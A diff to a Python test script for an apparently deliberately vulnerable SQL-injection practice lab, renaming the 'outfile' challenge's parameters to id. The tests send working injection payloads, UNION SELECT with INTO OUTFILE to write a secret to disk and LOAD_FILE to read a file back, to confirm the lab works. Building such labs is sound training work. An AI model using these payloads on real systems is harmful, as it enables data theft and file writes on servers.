@@ -628,20 +628,20 @@ check('SQL 注入模块共 8 个子关选项卡（含 JSON / 请求头）',
       and '/modules/sqli/outfile.php' in r.text and '文件读写' in r.text)
 payload_w = ("-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 "
              "INTO OUTFILE '%s'" % sqli_flag)
-r = get('/modules/sqli/outfile.php?step=write&w=' + urllib.parse.quote(payload_w))
+r = get('/modules/sqli/outfile.php?step=write&id=' + urllib.parse.quote(payload_w))
 check('文件读写「写入」框 INTO OUTFILE 落地成功',
       r.status_code == 200 and '文件已落地' in r.text, 'HTTP %d' % r.status_code)
 r = get('/modules/sqli/files/flag.txt')
 check('写出的 flag.txt 可访问且含通关凭证',
       r.status_code == 200 and '恭喜你完成本关挑战！' in r.text, 'HTTP %d' % r.status_code)
 payload_r = "-1 UNION SELECT 1,LOAD_FILE('%s'),3,4" % sqli_flag
-r = get('/modules/sqli/outfile.php?step=read&r=' + urllib.parse.quote(payload_r))
+r = get('/modules/sqli/outfile.php?step=read&id=' + urllib.parse.quote(payload_r))
 check('「读取」框 LOAD_FILE 注入回读并判定通关',
       '通关成功' in r.text and 'LOAD_FILE 注入读回的内容' in r.text)
 r = get('/modules/sqli/outfile.php')
-check('文件读写页含目标色块与写/读两个输入框',
+check('文件读写页含目标色块与写/读两个输入框（参数名统一为 id）',
       r.status_code == 200 and 'class="level-goal"' in r.text
-      and 'name="w"' in r.text and 'name="r"' in r.text)
+      and r.text.count('name="id"') == 2)
 try:
     os.remove(sqli_flag)
 except OSError:
